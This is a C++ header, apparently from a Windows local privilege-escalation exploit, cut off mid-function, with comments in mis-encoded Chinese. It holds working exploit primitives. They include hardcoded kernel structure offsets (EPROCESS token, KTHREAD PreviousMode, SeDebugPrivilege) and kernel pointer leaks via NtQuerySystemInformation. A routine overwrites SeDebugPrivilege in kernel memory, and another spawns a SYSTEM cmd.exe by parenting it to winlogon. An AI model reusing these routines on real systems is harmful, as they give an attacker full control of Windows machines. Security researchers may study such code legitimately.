#pragma once
#include <Windows.h>
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <ntstatus.h>
#include <winternl.h>
#include <evntprov.h>
#include <excpt.h>
#include <iostream>
#include <stdexcept>
#include <chrono>

#define MAXIMUM_FILENAME_LENGTH 255

#define SystemExtendedHandleInformation  0x40
#define SystemModuleInformation  0xb
#define SystemHandleInformation 0x10

// ws2019
#define WS19_OFFSET_PID 0x2e0 //dt _EPROCESS UniqueProcessId
#define WS19_OFFSET_PROCESS_LINKS 0x2e8 //dt _EPROCESS ActiveProcessLinks
#define WS19_OFFSET_TOKEN 0x358 //dt _EPROCESS Token

// w1022h2 ws2022
#define W10_OFFSET_PID 0x440 //UniqueProcessId
#define W10_OFFSET_PROCESS_LINKS 0x448 //ActiveProcessLinks
#define W10_OFFSET_TOKEN 0x4b8  //Token

#define WS08_PAGEDATA_NtSeDebugPrivilege_Offset       0xB0
#define WS08R2_PAGEDATA_NtSeDebugPrivilege_Offset    0xB8
#define WS12_PAGEDATA_NtSeDebugPrivilege_Offset       0xB8
#define WS12R2_PAGEDATA_NtSeDebugPrivilege_Offset    0x100 
#define WS16_PAGEDATA_NtSeDebugPrivilege_Offset       0xB48
#define WS19_PAGEDATA_NtSeDebugPrivilege_Offset       0x1538
#define WS22_PAGEDATA_NtSeDebugPrivilege_Offset_1     0x2398 // 2022-1
#define WS22_PAGEDATA_NtSeDebugPrivilege_Offset_5     0x1988 // 2022-5

#define OFFSET_KPROCESS 0x220  //dt nt!_kthread +0x220 Process          : Ptr64 _KPROCESS
#define OFFSET_KPREVIOUSMODE 0x232 //dt nt!_kthread +0x232 +0x232 PreviousMode     : Char
#define WS_PAGEDATA 0xd45000; //PAGEDATA ��� nt ��ƫ��

//typedef struct _UNICODE_STRING {
//  USHORT Length; //2�ֽ�
//  USHORT MaximumLength; //2�ֽ�
//  PWSTR  Buffer;
//} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    ULONG ProcessId;
    UCHAR ObjectTypeNumber;
    UCHAR Flags;
    USHORT Handle;
    void* Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE
{
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
#ifdef _WIN64
    ULONG                Reserved3;
#endif
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 w018;
    WORD                 NameOffset;
    CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;
typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;


// NtQuerySystemInformation ��������
typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );
typedef NTSTATUS NtQueryInformationToken(
    HANDLE                  TokenHandle, //Ҫ��ѯ�����Ƶľ��
    TOKEN_INFORMATION_CLASS TokenInformationClass,//һ��ö��ֵ��ָ��Ҫ��ѯ��������Ϣ������
    PVOID                   TokenInformation, //ָ�򻺳�����ָ�룬�û��������ڽ��ղ�ѯ������Ϣ��
    ULONG                   TokenInformationLength, //�������ĳ��ȣ����ֽ�Ϊ��λ
    PULONG                  ReturnLength //ָ��һ��������ָ�룬�ñ�������ʵ�ʷ��ص�������Ϣ����
);

// NtWriteVirtualMemory ������д��ָ�����̵������ַ�ռ�
typedef NTSTATUS(*pNtWriteVirtualMemory)(
    IN HANDLE               ProcessHandle, //Ҫд���ڴ�Ľ��̾��
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
    );
// NtReadVirtualMemory ��ȡָ�����̵������ַ�ռ����ݵ�������
typedef NTSTATUS(*pNtReadVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    OUT PVOID               Buffer,
    IN ULONG                NumberOfBytesToRead,
    OUT PULONG              NumberOfBytesReaded OPTIONAL
    );
pNtWriteVirtualMemory NtWriteVirtualMemory;
pNtReadVirtualMemory NtReadVirtualMemory;

// ����ϵͳ�汾��Ϣ�ṹ��
typedef struct OSVERSION {
    DWORD MajorVersion;
    DWORD MinorVersion;
    DWORD BuildNumber;
    DWORD RevisionNumber;
} OSVERSION;

LPCWSTR wCmdPath = L"C:\\Windows\\System32\\cmd.exe";
LPCSTR CmdPath = "C:\\Windows\\System32\\cmd.exe";
LPCWSTR wNtoPath = L"C:\\Windows\\System32\\ntoskrnl.exe";
LPCSTR NtoPath = "C:\\Windows\\System32\\ntoskrnl.exe";

LPCWSTR wNtoRootPath = L"\\SystemRoot\\system32\\ntoskrnl.exe";
LPCSTR NtoRootPath = "\\SystemRoot\\system32\\ntoskrnl.exe";

void ErrorStatusInfo(LPCSTR ErrorMsg, int error)
{
    printf("[-] %s\n", ErrorMsg);
    printf("    ������> %d\n", error);
}


// ͨ�����������ID��ȡ�ں˶���ָ��
PVOID GetKernelPointerByHandle(HANDLE HandleValue, DWORD ProcPid)
{
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
    if (ntdll == NULL) {
        ErrorStatusInfo("GetModuleHandle() failed to get ntdll.", GetLastError());
        return NULL;
    }

    PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (query == NULL) {
        ErrorStatusInfo("GetProcAddress() failed to get NtQuerySystemInformation.", GetLastError());
        return NULL;
    }

    ULONG len = 20;
    NTSTATUS status = (NTSTATUS)0xc0000004;  // STATUS_INFO_LENGTH_MISMATCH
    PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;

    do 
    {
        len *= 2;
        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
        if (pHandleInfo == NULL) {
            ErrorStatusInfo("GlobalAlloc() failed to alloc pHandleInfo.", GetLastError());
            return NULL;
        }

        status = query(
            (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, pHandleInfo, len, &len);
        // STATEINFO_LENGTH_MISMATCH ��ʾ������̫С���������
        if (status == (NTSTATUS)0xc0000004) {
            continue;
        }

        // �����κ������������
        if (status != 0) {
            ErrorStatusInfo("NtQuerySystemInformation failed.", GetLastError());
            GlobalFree(pHandleInfo);
            return NULL;
        }

        // �ڷ��صľ���б����������
        for (int i = 0; i < pHandleInfo->HandleCount; i++) 
        {
            PVOID object = pHandleInfo->Handles[i].Object;
            HANDLE handle = pHandleInfo->Handles[i].HandleValue;
            HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;

            if ((DWORD)pid == ProcPid && handle == HandleValue) {
                GlobalFree(pHandleInfo);
                return object;
            }
        }

    } while (status == (NTSTATUS)0xc0000004);  // ���������̫С����������

    GlobalFree(pHandleInfo);
    return NULL;
}

// ͨ����������ȡ pid
ULONG GetPidByName(LPCWSTR ProcName)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    ULONG pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) 
        {
            if (wcscmp(entry.szExeFile, ProcName) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);
    return pid;
}


// �����ļ����󷵻ؾ��
// ����ļ����ڣ�����ļ�; ����ļ������ڣ��򴴽����ļ�
HANDLE CreatFileObject(LPCWSTR FilePath)
{
    HANDLE hFileObject = CreateFileW(FilePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFileObject == INVALID_HANDLE_VALUE) {
        ErrorStatusInfo("Fail to open file.", GetLastError());
        return 0;
    }
    return hFileObject;
}

// ����һ��ģ�鲢����һ��ģ�������û�̬��ַ����Ҫ�� FreeLibrary(NTOUserBase); �ͷ�
// L"ntoskrnl.exe"
HMODULE GetModuleByName(LPCWSTR ModName)
{
    // hKern = LoadLibraryEx(ModName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    // ʹ�� LoadLibraryEx ����ģ�飬�����Ҫ����������ȥ�� DONT_RESOLVE_DLL_REFERENCES ��־
    HMODULE hMod = LoadLibraryEx(ModName, NULL, 0);  // ȥ�� DONT_RESOLVE_DLL_REFERENCES ��־
    if (!hMod) {
        ErrorStatusInfo("Failed to obtain module.", GetLastError());
        return NULL;
    }
    return hMod;
}


// ͨ��ģ������ȡģ���ں˻���ַ
DWORD64 GetModuleAddrByName(LPCSTR ModName)
{
    PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        free(buffer);
        buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer) {
        ErrorStatusInfo("Memory allocation failed.", GetLastError());
        return 0;
    }

    for (unsigned int i = 0; i < buffer->ModulesCount; i++)
    {
        PVOID kernelImageBase = buffer->Modules[i].ImageBaseAddress;
        PCHAR kernelImage = (PCHAR)buffer->Modules[i].Name;
        if (_stricmp(kernelImage, ModName) == 0) {
            free(buffer);
            return (DWORD64)kernelImageBase;
        }
    }

    printf("[-] Failed to obtain module base address.\n");
    free(buffer);
    return 0;
}


// ͨ��ģ��������������ȡ������ַ�����ں�ģ������
FARPROC GetFunAddrByModule(HMODULE Mod, const char* FunName)
{
    FARPROC FunAddr = GetProcAddress(Mod, FunName);
    if (!FunAddr) {
        ErrorStatusInfo("Failed to obtain function address.", GetLastError());
        return NULL;
    }
    return FunAddr;
}

// ͨ���ṩ�ľ����HANDLE�����Ҳ�������þ���������ں˶����ָ��
// ���Ҽ�����Ķ��������Ƿ����ṩ�� type �������
DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
{
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
    if (status == STATUS_INFO_LENGTH_MISMATCH){
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer){
        ErrorStatusInfo("NtQuerySystemInformation error.", GetLastError());
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;
        if (buffer->Handles[i].ProcessId == ProcPid 
            && buffer->Handles[i].ObjectTypeNumber == type)
        {
            // ����Ի�ȡ�������ָ��
            if (!handle) {
                printf("   [*] Objdect: %llx ObjectType: %d Handles: %x\n",
                    buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
                DWORD64 object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }

            if (handle == (HANDLE)buffer->Handles[i].Handle){
                DWORD64 object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }
        }
    }

    free(buffer);
    return 0;
}

// ͨ������ pid ���һ�����õ��ļ����� 
// win10 ObjectType 37 ws2022 ObjectType 39
DWORD64 GetFileObjKernelPointer(DWORD ProcPid)
{
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        ErrorStatusInfo("NtQuerySystemInformation error.", GetLastError());
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;
        // \Device\ConDrv ��һ�����õ��ļ����� Handle ����4
        if (buffer->Handles[i].ProcessId == ProcPid && buffer->Handles[i].Handle == 4) {
            printf("   [*] Objdect: %llx ObjectType: %d Handles: %x\n",
                buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
            DWORD64 object = (DWORD64)buffer->Handles[i].Object;
            free(buffer);
            return object;
        }
    }

    free(buffer);
    return 0;
}

// ͨ�� pattern ���Ҷ�
BOOL ScanSectionForPattern(HANDLE hProcess,
    LPVOID lpBaseAddress, SIZE_T dwSize, BYTE* pattern, SIZE_T patternSize, LPVOID* lpFoundAddress)
{
    BYTE* buffer = (BYTE*)malloc(dwSize);
    if (buffer == NULL) {
        return FALSE;
    }

    SIZE_T bytesRead;

    if (!ReadProcessMemory(hProcess, lpBaseAddress, buffer, dwSize, &bytesRead)) {
        free(buffer);
        return FALSE;
    }

    for (SIZE_T i = 0; i < dwSize - patternSize; i++) 
    {
        BOOL found = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) 
        {
            if (buffer[i + j] != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            *lpFoundAddress = (LPVOID)((DWORD_PTR)lpBaseAddress + i);
            free(buffer);
            return TRUE;
        }
    }

    free(buffer);
    return FALSE;
}

// ͨ���ֽ����в���ָ��ģ�����ĺ���
UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
{
    UINT_PTR relativeOffset = 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    LPVOID lpFoundAddress = NULL;

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (strcmp((CHAR*)pSectionHeader[i].Name, "PAGE") == 0){
            LPVOID lpSectionBaseAddress = (LPVOID)((LPBYTE)hModule + pSectionHeader[i].VirtualAddress);
            SIZE_T dwSectionSize = pSectionHeader[i].Misc.VirtualSize;

            if (ScanSectionForPattern(
                GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)){
                // �������ƫ����
                relativeOffset = (UINT_PTR)lpFoundAddress - (UINT_PTR)hModule;
            }

            break;
        }
    }

    return relativeOffset;
}



typedef LONG(WINAPI* RtlGetVersionFunc)(PRTL_OSVERSIONINFOW);
// ��ע����ж�ȡ UBR �޲��汾
DWORD GetOSRevisionNumber()
{
    HKEY hKey;
    if (RegOpenKeyEx(
        HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        DWORD ubr = 0;
        DWORD size = sizeof(ubr);
        if (RegQueryValueEx(hKey, L"UBR", NULL, NULL, (LPBYTE)&ubr, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return ubr;
        }
        else {
            printf("[-] UBR not found.\n");
        }
        RegCloseKey(hKey);
    }
    else {
        printf("[-] Failed to open registry key.\n");
    }

    return 0;
}
//printf("[*] OS Major Version: %d\n", OSVersion->MajorVersion);
//printf("[*] OS Minor Version: %d\n", OSVersion->MinorVersion);
//printf("[*] OS Build Number: %d\n", OSVersion->BuildNumber);
//printf("[*] OS Revision Number: %d\n", OSVersion->RevisionNumber);
// ��ȡ����ϵͳ�汾��Ϣ����Ҫ�汾����Ҫ�汾���ڲ��汾���޲��汾
void GetFullOSVersion(OSVERSION* OSVersion)
{
    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    if (hNtDll)
    {
        RtlGetVersionFunc RtlGetVersion = (RtlGetVersionFunc)GetProcAddress(hNtDll, "RtlGetVersion");
        if (RtlGetVersion)
        {
            RTL_OSVERSIONINFOW osInfo = { 0 };
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);
            if (RtlGetVersion(&osInfo) == 0) {
                DWORD dwRevisionNumber = GetOSRevisionNumber();
                OSVersion->MajorVersion = osInfo.dwMajorVersion;
                OSVersion->MinorVersion = osInfo.dwMinorVersion;
                OSVersion->BuildNumber = osInfo.dwBuildNumber;
                OSVersion->RevisionNumber = dwRevisionNumber;
            }
            else {
                printf("[-] Failed to get OS version.\n");
            }
        }
    }
}

// ͨ�����̾�����øľ��Ϊ LocalService ���ƣ���Ҫ����ԱȨ��
BOOL SetProcessTokenToLocalService(HANDLE hProcess)
{
    HANDLE hProcessToken = NULL;
    HANDLE hLocalServiceToken = NULL;
    BOOL result = FALSE;

    // 1. ��ָ�����̵ķ�������
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hProcessToken)) {
        ErrorStatusInfo("Failed to open process token.", GetLastError());
        return FALSE;
    }

    // 2. ʹ�� LogonUser ������ģ�� Local Service �ʻ�
    if (!LogonUserW(L"LocalService", L"NT AUTHORITY", NULL,
        LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, &hLocalServiceToken)) {
        ErrorStatusInfo("Failed to log on as LOCAL SERVICE.", GetLastError());
        CloseHandle(hProcessToken);
        return FALSE;
    }

    // 3. ����һ���µ������ƣ�������Ϊ Local Service �ʻ�
    HANDLE hNewToken = NULL;
    if (!DuplicateTokenEx(hLocalServiceToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY,
        NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        ErrorStatusInfo("Failed to duplicate token.", GetLastError());
    }
    else if (!SetTokenInformation(hNewToken, TokenUser, hLocalServiceToken, sizeof(hLocalServiceToken))) {
        ErrorStatusInfo("Failed to set process token to LOCAL SERVICE.", GetLastError());
    }
    else {
        printf("[+] Successfully replaced token with NT AUTHORITY\\LOCAL SERVICE.\n");
        result = TRUE;
    }

    // ������
    CloseHandle(hLocalServiceToken);
    CloseHandle(hNewToken);
    CloseHandle(hProcessToken);

    return result;
}

// ���� Privilege����Ҫ����ԱȨ��
BOOL EnablePrivilege(HANDLE hProcess, LPCWSTR PrivilegeValue) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        ErrorStatusInfo("Failed to open process token.", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, PrivilegeValue, &luid)) {
        ErrorStatusInfo("LookupPrivilegeValue error.", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        ErrorStatusInfo("AdjustTokenPrivileges error.", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}


int SetProcessTokenToLocalServiceTest()
{
    // �� LocalService ����
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    TOKEN_PRIVILEGES priv = { 0 };

    // ��ȡ LocalService ������
    LPTSTR lpSystemName = NULL; // ����ϵͳ
    LPCWSTR lpUsername = TEXT("NT AUTHORITY\\LocalService");
    WCHAR lpPassword[64] = { 0 }; // LocalService ����Ҫ����
    DWORD dwLogonFlags = LOGON_WITH_PROFILE;
    DWORD dwLogonType = LOGON32_LOGON_SERVICE;
    DWORD dwLogonProvider = LOGON32_PROVIDER_DEFAULT;

    if (!LogonUser(lpUsername, lpSystemName, lpPassword, dwLogonType, dwLogonProvider, &hToken)) {
        ErrorStatusInfo("LogonUser failed.", GetLastError());
        return 1;
    }

    // ��������
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        ErrorStatusInfo("DuplicateTokenEx failed.", GetLastError());
        CloseHandle(hToken);
        return 1;
    }

    // �ر�ԭʼ����
    CloseHandle(hToken);

    // ���������Ƶ�Ȩ��
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {
        ErrorStatusInfo("LookupPrivilegeValue failed.", GetLastError());
        CloseHandle(hDupToken);
        return 1;
    }

    if (!AdjustTokenPrivileges(hDupToken, FALSE, &priv, 0, NULL, NULL)) {
        ErrorStatusInfo("AdjustTokenPrivileges failed.", GetLastError());
        CloseHandle(hDupToken);
        return 1;
    }

    // ���ý�������
    if (!SetThreadToken(NULL, hDupToken)) {
        ErrorStatusInfo("SetThreadToken failed.", GetLastError());
        CloseHandle(hDupToken);
        return 1;
    }

    //std::cout << "Token successfully changed to LocalService." << std::endl;
    printf("[+] Token successfully changed to LocalService.\n");

    // �ͷ����ƾ��
    CloseHandle(hDupToken);

    return 0;
}

// ��ȡ CPU ������
int GetCoreCount()
{
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    return sysinfo.dwNumberOfProcessors;
}



// �����߳�ͨ�����������
DWORD CreateProcFromHandleCommand(HANDLE Handle, LPWSTR Command) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;
    BOOL ret;

    // Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        0,
        size
    );
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 
        0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &Handle, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Finally, create the process
    ret = CreateProcessW(
        NULL,
        Command,
        NULL,
        NULL,
        true,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        reinterpret_cast<LPSTARTUPINFOW>(&si),
        &pi
    );

    if (ret == false) {
        ErrorStatusInfo("Error creating new process.", GetLastError());
        return 3;
    }

    printf("[+] Enjoy your new SYSTEM process.\n");
    return 0;
}

// ���� cmd �߳�ͨ�����
void CreateCmdProcFromHandle(HANDLE hProcess) {
    int error;
    BOOL status;
    SIZE_T size = 0;
    LPVOID lpValue = NULL;
    STARTUPINFOEXW si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = NULL;
    wchar_t cmd_process[] = L"C:\\Windows\\System32\\cmd.exe";


    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Initialize the thread attribute list
    do
    {
        status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
        error = GetLastError();

        if (!status)
        {
            if (si.lpAttributeList != NULL)
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
            ZeroMemory(si.lpAttributeList, size);
        }
    } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

    // Update the thread attribute with the parent process handle
    do
    {
        if (!status)
        {
            ErrorStatusInfo("Failed to initialize thread attribute list.", GetLastError());
            break;
        }

        lpValue = HeapAlloc(GetProcessHeap(), 0, sizeof(HANDLE));
        memcpy(lpValue, &hProcess, sizeof(HANDLE));

        status = UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            lpValue,
            sizeof(HANDLE),
            NULL,
            NULL
        );

        if (!status)
        {
            ErrorStatusInfo("Failed to update thread attribute.", GetLastError());
            break;
        }

        status = CreateProcessW(
            NULL, 
            (LPWSTR)wCmdPath, 
            NULL, 
            NULL, 
            FALSE, 
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, 
            NULL, 
            NULL, 
            &si.StartupInfo, 
            &pi
        );

        if (!status)
        {
            ErrorStatusInfo("Failed to create new process.", GetLastError());
        }
        else
        {
            printf("[+] New process created successfully.\n");
            printf("    ������> PID : %lu\n", pi.dwProcessId);
            printf("    ������> TID : %lu\n", pi.dwThreadId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    } while (0);

    // Clean up allocated memory
    if (lpValue != NULL)
        HeapFree(GetProcessHeap(), 0, lpValue);

    if (si.lpAttributeList != NULL)
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
}
// ���� CMD
int spwan_cmd_system()
{
    DWORD winlogonPID;

    winlogonPID = GetPidByName(L"winlogon.exe");
    if (winlogonPID == 0) {
        ErrorStatusInfo("Failed to find winlogon.exe process.", GetLastError());
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, winlogonPID);
    if (!hProcess) {
        ErrorStatusInfo("OpenProcess failed.", GetLastError());
        return 1;
    }

    CreateCmdProcFromHandle(hProcess);

    // We are done
    CloseHandle(hProcess);
    return 0;
}

// �޸� SeDebugPrivilege �ں˱���ֵΪ 0x17 ������Ȩ��ǰ���� PreviousMode Ϊ0��
void WSeDebugPrivilege(HANDLE hProc, ULONGLONG SeDebugPrivilegeAddr)
{
    ULONGLONG DebugPrivilege = 0x17;
    NtWriteVirtualMemory(hProc, (PVOID)(SeDebugPrivilegeAddr), &DebugPrivilege, 8, 0);
}
void WSeDebugPrivilegeSelfProc(ULONGLONG SeDebugPrivilegeAddr)
{
    HANDLE hProc = GetCurrentProcess(); //��ǰ�߳̾��
    ULONGLONG DebugPrivilege = 0x17;
    NtWriteVirtualMemory(hProc, (PVOID)(SeDebugPrivilegeAddr), &DebugPrivilege, 8, 0);
}

// ��ȡ ntoskrnl.exe PE �ṹ���� PAGEDATA �ε���ʼ��ַ��
// DWORD baseAddress = GetPagedataSectionBaseAddress(filePath);
DWORD GetPagedataSectionBaseAddress(LPCWSTR filePath)
{
    HANDLE hFile = CreateFileW(filePath,
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return 0;
    }

    BYTE* buffer = new BYTE[fileSize];
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        delete[] buffer;
        CloseHandle(hFile);
        return 0;
    }
    CloseHandle(hFile);

    // ��� DOS ͷ
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        delete[] buffer;
        return 0;
    }

    // ���� PE ͷ
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(buffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        delete[] buffer;
        return 0;
    }

    // ��ȡ�ڱ�
    PIMAGE_SECTION_HEADER pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);

    // �����ڱ�Ѱ�� PAGEDATA ��
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) 
    {
        if (memcmp(pSectionHeaders[i].Name, "PAGEDATA", 8) == 0) {
